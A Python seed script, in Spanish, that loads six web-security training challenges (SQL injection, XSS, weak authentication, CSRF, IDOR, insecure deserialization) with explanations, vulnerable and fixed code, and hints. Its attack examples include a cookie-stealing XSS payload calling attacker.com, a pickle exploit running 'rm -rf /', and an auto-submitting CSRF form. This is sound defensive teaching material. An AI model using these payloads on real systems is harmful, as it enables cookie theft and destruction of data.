"""
Script para cargar desafíos de seguridad iniciales en la base de datos
"""

import sys
from datetime import datetime
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from app.db.session import SessionLocal
from app.models.challenge import Challenge, Hint, DifficultyLevel, VulnerabilityType, AttackType

def load_initial_challenges():
    db = SessionLocal()
    
    challenges_data = [
        {
            "title": "SQL Injection - Básico",
            "description": "Aprende cómo se ejecutan ataques SQL Injection y cómo prevenirlos",
            "difficulty": DifficultyLevel.BEGINNER,
            "vulnerability_type": VulnerabilityType.SQL_INJECTION,
            "attack_type": AttackType.INJECTION,
            "vulnerability_explanation": """
SQL Injection es una técnica de ataque que permite a un atacante manipular consultas SQL.
Cuando el código concatena directamente entrada del usuario en una consulta SQL, un atacante puede:
1. Modificar la lógica de la consulta
2. Acceder a datos no autorizados
3. Modificar o eliminar datos
4. Ejecutar comandos administrativos en la base de datos

El problema ocurre cuando confías en la entrada del usuario sin validar o sanitizar.
            """,
            "attack_explanation": """
Ejemplo de ataque:
- Usuario legítimo: email = "user@example.com"
- Usuario malicioso: email = "' OR '1'='1"

Consulta vulnerable:
SELECT * FROM users WHERE email = 'admin@example.com' AND password = 'admin123'

Consulta con inyección:
SELECT * FROM users WHERE email = '' OR '1'='1' AND password = ''

Resultado: Retorna TODOS los usuarios sin verificar contraseña
            """,
            "countermeasures": """
1. **Prepared Statements**: Usa consultas preparadas con placeholders
2. **Validación de entrada**: Valida y sanitiza todos los datos de entrada
3. **Principio de menor privilegio**: Las credenciales de DB deben tener permisos limitados
4. **WAF (Web Application Firewall)**: Detecta patrones de SQL injection
5. **Logging y monitoreo**: Registra todas las queries ejecutadas
            """,
            "vulnerable_code": """
def login_user(email, password):
    query = f"SELECT * FROM users WHERE email = '{email}' AND password = '{password}'"
    result = db.execute(query)
    return result.fetchone()

# Usuario envía: email = "' OR '1'='1"
# Query resultante: SELECT * FROM users WHERE email = '' OR '1'='1' AND password = ''
            """,
            "vulnerable_code_language": "Python",
            "secure_code": """
def login_user(email, password):
    query = "SELECT * FROM users WHERE email = ? AND password = ?"
    result = db.execute(query, (email, password))
    return result.fetchone()

# O usando un ORM:
user = db.query(User).filter(
    User.email == email,
    User.password == hashed(password)
).first()
            """,
            "secure_code_language": "Python",
            "cvss_score": 9.8,
            "owasp_top_10": "A01:2021",
            "cwe_id": "CWE-89",
            "test_endpoint": "/api/login",
            "test_payload": "' OR '1'='1",
            "expected_result": "Debe rechazar la entrada y mostrar error de validación",
            "references": "OWASP SQL Injection, CWE-89, NIST Guidelines",
            "difficulty_order": 1
        },
        {
            "title": "Cross-Site Scripting (XSS) - Stored",
            "description": "Entiende cómo XSS permite inyectar scripts maliciosos",
            "difficulty": DifficultyLevel.BEGINNER,
            "vulnerability_type": VulnerabilityType.XSS,
            "attack_type": AttackType.CROSS_SITE,
            "vulnerability_explanation": """
Cross-Site Scripting (XSS) permite a atacantes inyectar código JavaScript malicioso.
Hay tres tipos:

1. **Stored XSS**: El código se almacena en la BD y se ejecuta para cada usuario que lo ve
2. **Reflected XSS**: El código se refleja en la respuesta sin almacenarse
3. **DOM-based XSS**: El código JavaScript ejecutado en el cliente es vulnerable

El problema: Confiar en entrada del usuario y mostrarla sin escapar.
            """,
            "attack_explanation": """
Escenario Stored XSS:
1. Atacante crea un comentario: <script>alert('XSS')</script>
2. El código se almacena sin validación
3. Otros usuarios ven el comentario y el script se ejecuta en su navegador
4. El atacante puede: robar cookies, redirigir, cambiar contenido, phishing

Escenario avanzado:
<img src=x onerror="fetch('https://attacker.com?cookie=' + document.cookie)">
            """,
            "countermeasures": """
1. **Escapar salida**: Convertir <, >, &, ", ' a entidades HTML
2. **Content Security Policy**: Definir qué scripts se pueden ejecutar
3. **Validar entrada**: Whitelist de caracteres permitidos
4. **Usar templating engines seguros**: Escapan automáticamente
5. **HttpOnly cookies**: Impide acceso desde JavaScript
6. **SameSite cookies**: Previene CSRF
            """,
            "vulnerable_code": """
// React - VULNERABLE
function Comment({ text }) {
    return <div dangerouslySetInnerHTML={{ __html: text }} />;
}

// HTML - VULNERABLE
<div id="comment"><!-- User input inserted directly --></div>
<script>
    document.getElementById('comment').innerHTML = userInput;
</script>
            """,
            "vulnerable_code_language": "JavaScript",
            "secure_code": """
// React - SEGURO
function Comment({ text }) {
    return <div>{text}</div>;  // React escapa automáticamente
}

// O explícitamente:
import DOMPurify from 'dompurify';
function Comment({ text }) {
    return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(text) }} />;
}

// HTML - SEGURO
document.getElementById('comment').textContent = userInput;
            """,
            "secure_code_language": "JavaScript",
            "cvss_score": 7.1,
            "owasp_top_10": "A03:2021",
            "cwe_id": "CWE-79",
            "test_endpoint": "/api/comments",
            "test_payload": "<script>alert('XSS')</script>",
            "expected_result": "El script debe ser escapado y mostrado como texto",
            "references": "OWASP XSS, CWE-79, Content Security Policy",
            "difficulty_order": 2
        },
        {
            "title": "Broken Authentication - Contraseña débil",
            "description": "Descubre cómo las contraseñas débiles comprometen la seguridad",
            "difficulty": DifficultyLevel.BEGINNER,
            "vulnerability_type": VulnerabilityType.BROKEN_AUTH,
            "attack_type": AttackType.AUTHENTICATION,
            "vulnerability_explanation": """
Broken Authentication ocurre cuando una aplicación permite:

1. **Contraseñas débiles**: No enforza políticas de contraseña fuerte
2. **Sin MFA**: Permite acceso solo con contraseña
3. **Session tokens predecibles**: Tokens fáciles de adivinar
4. **Gestión de sesión pobre**: No invalida sesiones correctamente
5. **Sin límite de intentos**: Permite fuerza bruta ilimitada

Resultado: Acceso no autorizado a cuentas de usuario
            """,
            "attack_explanation": """
Ataque por Fuerza Bruta:
- Sin límite de intentos: El atacante prueba millones de contraseñas
- Diccionario + Fuerza Bruta: Combina palabras comunes con variaciones
- Rainbow Tables: Usa tablas precalculadas de hashes

Ataque por Credenciales por defecto:
- Muchas apps tienen credenciales por defecto no cambiadas
- admin/admin, admin/12345, etc.

Ataque por Session Fixation:
- Fuerza al usuario a usar una sesión conocida
- Luego accede a la cuenta con esa sesión
            """,
            "countermeasures": """
1. **Contraseñas fuertes**: Mín. 12 caracteres, mayúsculas, números, símbolos
2. **Hashing seguro**: Usa bcrypt, scrypt, argon2 (NUNCA MD5/SHA1)
3. **Multi-Factor Authentication**: SMS, Authenticator, Biometría
4. **Rate limiting**: Máximo X intentos por minuto
5. **Account lockout**: Bloquea temporalmente después de X intentos
6. **Validar identidad**: Preguntas de seguridad, código de verificación
7. **Monitoreo**: Alertas por intentos de acceso fallidos
            """,
            "vulnerable_code": """
import hashlib

def register_user(username, password):
    # VULNERABLE: Sin validación de contraseña fuerte
    hashed = hashlib.sha1(password.encode()).hexdigest()
    db.execute(f"INSERT INTO users (username, password) VALUES ('{username}', '{hashed}')")

def login_attempt(username, password):
    # VULNERABLE: Sin límite de intentos
    user = db.query(User).filter(User.username == username).first()
    if user and user.password == hashlib.sha1(password.encode()).hexdigest():
        return generate_session(user)
    return None
            """,
            "vulnerable_code_language": "Python",
            "secure_code": """
import bcrypt
import re
from datetime import datetime, timedelta

def register_user(username, password):
    # Validar contraseña fuerte
    if len(password) < 12:
        raise ValueError("Contraseña debe tener mín. 12 caracteres")
    if not re.search(r'[A-Z]', password):
        raise ValueError("Debe contener mayúsculas")
    if not re.search(r'[0-9]', password):
        raise ValueError("Debe contener números")
    if not re.search(r'[!@#$%^&*]', password):
        raise ValueError("Debe contener caracteres especiales")
    
    # Hash seguro
    hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
    db.add(User(username=username, password_hash=hashed))

def check_rate_limiting(username):
    attempts = db.query(LoginAttempt).filter(
        LoginAttempt.username == username,
        LoginAttempt.timestamp > datetime.utcnow() - timedelta(minutes=1)
    ).count()
    
    if attempts >= 5:
        raise Exception("Demasiados intentos. Intenta en 15 minutos")

def login_attempt(username, password):
    check_rate_limiting(username)
    
    user = db.query(User).filter(User.username == username).first()
    if user and bcrypt.checkpw(password.encode(), user.password_hash):
        # Generate MFA code
        send_mfa_code(user.email)
        return {"status": "mfa_required"}
    
    # Registrar intento fallido
    db.add(LoginAttempt(username=username, timestamp=datetime.utcnow()))
    return None
            """,
            "secure_code_language": "Python",
            "cvss_score": 9.1,
            "owasp_top_10": "A07:2021",
            "cwe_id": "CWE-287",
            "test_endpoint": "/api/register",
            "test_payload": "Pass123",
            "expected_result": "Debe rechazar y pedir contraseña más fuerte",
            "references": "OWASP Authentication, NIST 800-63B, CWE-287",
            "difficulty_order": 3
        },
        {
            "title": "CSRF - Falsificación de solicitud entre sitios",
            "description": "Cómo protegerse contra ataques CSRF",
            "difficulty": DifficultyLevel.INTERMEDIATE,
            "vulnerability_type": VulnerabilityType.CSRF,
            "attack_type": AttackType.CROSS_SITE,
            "vulnerability_explanation": """
Cross-Site Request Forgery (CSRF) permite a un atacante ejecutar acciones
sin consentimiento del usuario.

Cómo funciona:
1. Accedes a tu banco y te autentificas
2. Accedes a un sitio malicioso SIN cerrar la sesión del banco
3. El sitio malicioso hace una solicitud: transferencia de dinero
4. El navegador envía automáticamente tus cookies de autenticación
5. La transferencia se ejecuta sin tu consentimiento

Requisitos para CSRF:
- Estar autenticado en el sitio
- El navegador envía automáticamente cookies
- El sitio no valida el origen de la solicitud
            """,
            "attack_explanation": """
Ejemplo de ataque:

1. Atacante crea sitio malicioso: attacker.com
2. En attacker.com coloca:
   <img src="https://bank.com/transfer?to=attacker&amount=1000">

3. Usuario autenticado en bank.com visita attacker.com
4. El navegador ejecuta automáticamente la transferencia

O más sofisticado:
   <form action="https://bank.com/transfer" method="POST">
       <input name="to" value="attacker">
       <input name="amount" value="1000">
   </form>
   <script>document.forms[0].submit()</script>
            """,
            "countermeasures": """
1. **CSRF Tokens**: Incluir token único en cada formulario
2. **SameSite Cookies**: Cookies no se envían con solicitudes cross-site
3. **Origin/Referer Header**: Validar origen de la solicitud
4. **Double Submit Cookies**: Token en cookie y form
5. **Custom Headers**: Usar headers que JS no puede enviar cross-site
6. **POST for critical actions**: Nunca cambios con GET
            """,
            "vulnerable_code": """
# Backend - VULNERABLE
@app.post("/transfer")
def transfer_money(to: str, amount: float):
    # No hay validación de CSRF token
    current_user = get_current_user()
    transfer(current_user.id, to, amount)
    return {"status": "success"}

# Frontend - VULNERABLE
<!-- Formulario sin CSRF token -->
<form method="POST" action="/transfer">
    <input name="to" placeholder="Destinatario">
    <input name="amount" placeholder="Cantidad">
    <button>Transferir</button>
</form>
            """,
            "vulnerable_code_language": "Python/HTML",
            "secure_code": """
# Backend - SEGURO
from csrf import generate_csrf_token, validate_csrf_token

@app.post("/transfer")
def transfer_money(to: str, amount: float, csrf_token: str):
    # Validar token CSRF
    if not validate_csrf_token(csrf_token):
        raise HTTPException(status_code=403, detail="Invalid CSRF token")
    
    current_user = get_current_user()
    transfer(current_user.id, to, amount)
    return {"status": "success"}

# Frontend - SEGURO
<!-- Incluir CSRF token en formulario -->
<form method="POST" action="/transfer">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    <input name="to" placeholder="Destinatario">
    <input name="amount" placeholder="Cantidad">
    <button>Transferir</button>
</form>

// Set SameSite cookies
response.set_cookie("session", value, samesite="Strict")
            """,
            "secure_code_language": "Python/HTML",
            "cvss_score": 8.1,
            "owasp_top_10": "A01:2021",
            "cwe_id": "CWE-352",
            "test_endpoint": "/api/transfer",
            "test_payload": "to=hacker&amount=10000",
            "expected_result": "Debe rechazar sin CSRF token válido",
            "references": "OWASP CSRF, CWE-352, SameSite Cookies",
            "difficulty_order": 4
        },
        {
            "title": "Insecure Direct Object References (IDOR)",
            "description": "Accede a objetos que no deberías poder ver",
            "difficulty": DifficultyLevel.INTERMEDIATE,
            "vulnerability_type": VulnerabilityType.INSECURE_DIRECT_OBJECT_REFERENCE,
            "attack_type": AttackType.AUTHORIZATION,
            "vulnerability_explanation": """
IDOR ocurre cuando una aplicación expone referencias internas de objetos
sin verificar autorización.

Ejemplo:
- URL: /users/profile?user_id=123
- Atacante cambia a: /users/profile?user_id=124
- Accede al perfil de otro usuario sin permiso

El problema: La aplicación confía en que solo usuarios autorizados
accederán a los recursos, pero no lo valida.
            """,
            "attack_explanation": """
Escenarios comunes:

1. IDs secuenciales:
   /document/view?id=101 → /document/view?id=102 → /document/view?id=103

2. UUIDs en URLs:
   /orders/550e8400-e29b-41d4-a716-446655440000
   Cambiar UUID por otro conocido o adivinado

3. Parámetros predecibles:
   /invoice?invoice_id=2024001
   /invoice?invoice_id=2024002

4. Roles y permisos no validados:
   /admin?user_id=admin → Acceso a panel admin como usuario normal
            """,
            "countermeasures": """
1. **Autorización en servidor**: Siempre validar permisos en backend
2. **UUIDs impredecibles**: Usar UUIDs en lugar de IDs secuenciales
3. **Validar propiedad**: Verificar que el usuario es dueño del recurso
4. **Logs de acceso**: Registrar todos los accesos a recursos
5. **Access control**: Matriz de permisos clara
6. **Segmentación**: Datos sensibles en tablas separadas
            """,
            "vulnerable_code": """
@app.get("/user/{user_id}/profile")
def get_user_profile(user_id: int):
    # VULNERABLE: No valida que el usuario es dueño del perfil
    user = db.query(User).filter(User.id == user_id).first()
    return user

@app.get("/invoice/{invoice_id}")
def get_invoice(invoice_id: int):
    # VULNERABLE: No valida que el usuario puede ver la factura
    invoice = db.query(Invoice).filter(Invoice.id == invoice_id).first()
    return invoice
            """,
            "vulnerable_code_language": "Python",
            "secure_code": """
@app.get("/user/{user_id}/profile")
def get_user_profile(user_id: int, current_user = Depends(get_current_user)):
    # SEGURO: Validar que es el mismo usuario
    if current_user.id != user_id:
        raise HTTPException(status_code=403, detail="Not authorized")
    
    user = db.query(User).filter(User.id == user_id).first()
    return user

@app.get("/invoice/{invoice_id}")
def get_invoice(invoice_id: UUID, current_user = Depends(get_current_user)):
    # SEGURO: Usar UUIDs y validar propiedad
    invoice = db.query(Invoice).filter(
        Invoice.id == invoice_id,
        Invoice.user_id == current_user.id
    ).first()
    
    if not invoice:
        raise HTTPException(status_code=404, detail="Not found")
    
    return invoice
            """,
            "secure_code_language": "Python",
            "cvss_score": 8.2,
            "owasp_top_10": "A01:2021",
            "cwe_id": "CWE-639",
            "test_endpoint": "/api/user/999/profile",
            "test_payload": "user_id=999",
            "expected_result": "Debe rechazar acceso si no es el usuario autenticado",
            "references": "OWASP IDOR, CWE-639, Authorization Testing",
            "difficulty_order": 5
        },
        {
            "title": "Serialización Insegura",
            "description": "Cómo deserializar datos no confiables puede ser peligroso",
            "difficulty": DifficultyLevel.ADVANCED,
            "vulnerability_type": VulnerabilityType.DESERIALIZATION,
            "attack_type": AttackType.SERIALIZATION,
            "vulnerability_explanation": """
La deserialización insegura ocurre cuando una aplicación deserializa
datos no confiables sin validación.

Peligro: Un atacante puede ejecutar código arbitrario durante
la deserialización.

Lenguajes vulnerables:
- Python (pickle)
- Java (serialización nativa)
- PHP (unserialize)
- Ruby (YAML.load)

No vulnerables:
- JSON (por defecto)
- Protocol Buffers
            """,
            "attack_explanation": """
Python Pickle - Ejemplo:

import pickle
import os

# VULNERABLE
data = request.data
obj = pickle.loads(data)  # RCE aquí!

Payload malicioso que ejecuta comando:
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('rm -rf /',))

exploit = pickle.dumps(Exploit())
print(base64.b64encode(exploit))

Java - Ejemplo similar con ObjectInputStream

Consecuencias:
- Ejecución remota de código (RCE)
- Acceso a sistema de archivos
- Instalación de malware
- Robo de datos
            """,
            "countermeasures": """
1. **Nunca deserialices datos no confiables**: Especialmente con pickle/pickle
2. **Usa JSON**: Es seguro por defecto
3. **Validación estricta**: Validar estructura esperada
4. **Class whitelisting**: Si debes usar objetos, whitelist clases permitidas
5. **Desactiva serialización**: En Java, deshabilita ObjectInputStream
6. **Actualiza librerías**: Parches de seguridad
7. **Sandboxing**: Ejecuta deserialización en ambiente aislado
            """,
            "vulnerable_code": """
import pickle

# VULNERABLE
def deserialize_user(data):
    user = pickle.loads(data)  # Ejecución remota de código posible
    return user

# VULNERABLE
def deserialize_config(yaml_data):
    import yaml
    config = yaml.load(yaml_data)  # RCE posible
    return config
            """,
            "vulnerable_code_language": "Python",
            "secure_code": """
import json
import jsonschema

# SEGURO
USER_SCHEMA = {
    "type": "object",
    "properties": {
        "name": {"type": "string"},
        "email": {"type": "string"}
    },
    "required": ["name", "email"]
}

def deserialize_user(data):
    # Descodificar JSON en lugar de pickle
    user_data = json.loads(data)
    # Validar contra schema
    jsonschema.validate(user_data, USER_SCHEMA)
    return user_data

# Alternativa con marshmallow
from marshmallow import Schema, fields, ValidationError

class UserSchema(Schema):
    name = fields.Str(required=True)
    email = fields.Email(required=True)

def deserialize_user(data):
    schema = UserSchema()
    return schema.load(json.loads(data))
            """,
            "secure_code_language": "Python",
            "cvss_score": 10.0,
            "owasp_top_10": "A08:2021",
            "cwe_id": "CWE-502",
            "test_endpoint": "/api/deserialize",
            "test_payload": "pickle_data",
            "expected_result": "Debe usar JSON, no pickle",
            "references": "OWASP Deserialization, CWE-502, ysoserial",
            "difficulty_order": 6
        }
    ]
    
    # Crear desafíos
    for challenge_data in challenges_data:
        existing = db.query(Challenge).filter(
            Challenge.title == challenge_data["title"]
        ).first()
        
        if not existing:
            challenge = Challenge(**challenge_data)
            db.add(challenge)
            db.commit()
            db.refresh(challenge)
            print(f"✓ Creado: {challenge.title}")
            
            # Añadir pistas según el desafío
            hints_data = get_hints_for_challenge(challenge.title)
            for hint_data in hints_data:
                hint = Hint(challenge_id=challenge.id, **hint_data)
                db.add(hint)
            
            db.commit()
        else:
            print(f"✗ Ya existe: {challenge_data['title']}")
    
    print("\\n✓ Carga inicial completada")
    db.close()

def get_hints_for_challenge(title):
    hints = {
        "SQL Injection - Básico": [
            {"title": "Pista 1: ¿Qué es un prepared statement?", 
             "content": "Un prepared statement es una forma de enviar comandos SQL donde los datos y el código están separados. Busca cómo usar ? o %s en lugar de concatenar strings.",
             "level": 1},
            {"title": "Pista 2: Examina el código vulnerable",
             "content": "Nota cómo la consulta usa f-strings para insertar variables. ¿Qué pasaría si el email fuera '\\' OR \\'1\\'=\\'1?",
             "level": 2},
            {"title": "Pista 3: ORM es tu amigo",
             "content": "SQLAlchemy, Django ORM, y otros ORMs previenen SQL injection automáticamente. Nunca ejecutes raw SQL con concatenación.",
             "level": 3}
        ],
        "Cross-Site Scripting (XSS) - Stored": [
            {"title": "Pista 1: ¿Qué es escapar HTML?",
             "content": "Escapar HTML significa convertir < a &lt;, > a &gt;, & a &amp;. Así el navegador lo muestra como texto, no código.",
             "level": 1},
            {"title": "Pista 2: React es seguro por defecto",
             "content": "Si usas {variable} en JSX, React automáticamente escapa el HTML. Cuidado con dangerouslySetInnerHTML.",
             "level": 2},
            {"title": "Pista 3: Content Security Policy",
             "content": "Configura CSP headers para decirle al navegador qué scripts pueden ejecutarse. Esto preven muchos XSS.",
             "level": 3}
        ],
        "Broken Authentication - Contraseña débil": [
            {"title": "Pista 1: ¿Por qué NO usar MD5 o SHA1?",
             "content": "MD5 y SHA1 son rápidos pero inseguros. Para contraseñas, QUIERES que sea lento. Usa bcrypt (diseñado para contraseñas).",
             "level": 1},
            {"title": "Pista 2: Rate limiting salva vidas",
             "content": "Si permites intentos ilimitados, un atacante puede probar millones de contraseñas. Limita a 5 intentos / minuto.",
             "level": 2},
            {"title": "Pista 3: MFA es obligatorio hoy",
             "content": "Incluso con buena contraseña, sin MFA un atacante puede acceder con ella. Usa Google Authenticator, SMS, o biometría.",
             "level": 3}
        ],
        "CSRF - Falsificación de solicitud entre sitios": [
            {"title": "Pista 1: ¿Por qué GET != POST?",
             "content": "GET no debería cambiar datos (idempotente). Siempre usa POST/PUT/DELETE para cambios. Así navegadores no ejecutan CSRF con GET.",
             "level": 1},
            {"title": "Pista 2: CSRF tokens",
             "content": "Genera un token único para cada formulario. Valida que esté presente en cada solicitud. El atacante no puede conocerlo.",
             "level": 2},
            {"title": "Pista 3: SameSite cookies",
             "content": "Cookie con SameSite=Strict no se envía en solicitudes cross-site. Es la protección más moderna.",
             "level": 3}
        ],
        "Insecure Direct Object References (IDOR)": [
            {"title": "Pista 1: Siempre validar autorización",
             "content": "Solo porque alguien tiene acceso a su propio recurso NO significa que puede acceder al de otros. Valida SIEMPRE en el servidor.",
             "level": 1},
            {"title": "Pista 2: UUIDs > Números secuenciales",
             "content": "Si usas ID 1, 2, 3... es trivial predecir IDs. Usa UUIDs o GUIDs que son impredecibles.",
             "level": 2},
            {"title": "Pista 3: No confíes en el cliente",
             "content": "El cliente puede enviar cualquier ID. Tu servidor debe verificar que el usuario logueado es el dueño del recurso.",
             "level": 3}
        ],
        "Serialización Insegura": [
            {"title": "Pista 1: JSON es tu amigo",
             "content": "JSON es seguro por defecto. Nunca puede ejecutar código. Si necesitas serializar, usa JSON en lugar de pickle/yaml.load.",
             "level": 1},
            {"title": "Pista 2: Pickle es para datos no confiables",
             "content": "Pickle debería NUNCA usarse con datos de usuarios o internet. Es como ejecutar código arbitrario en `eval(user_input)`.",
             "level": 2},
            {"title": "Pista 3: Validación de schema",
             "content": "Si deserializas JSON, valida que tenga la estructura esperada. Usa jsonschema o marshmallow para validar estructura y tipos.",
             "level": 3}
        ]
    }
    
    return hints.get(title, [])

if __name__ == "__main__":
    load_initial_challenges()
